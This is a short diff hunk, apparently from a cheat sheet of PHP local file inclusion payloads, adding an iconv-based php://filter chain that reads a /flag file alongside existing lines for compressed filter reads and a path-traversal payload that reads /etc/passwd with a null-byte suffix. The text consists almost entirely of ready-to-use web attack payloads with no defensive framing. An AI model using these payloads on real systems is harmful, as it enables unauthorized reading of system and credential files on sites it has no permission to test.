@@ -14,6 +14,9 @@ view-source:data://text/plain;base64,Ym9uam91cgo=
 # use compression
 php://filter/zlib.deflate/convert.base64-encode/resource=bigfile.txt
 
+# use iconv to convert a file to a php image
+php://filter/convert.iconv.IBM1154%2fUTF-32BE/resource=/flag http://gynvael.coldwind.pl/?lang=en&id=671
+
 # does a folder exist
 index.php?page=../../../../../../var/www/dossierexistant/../../../../../etc/passwd%00
 
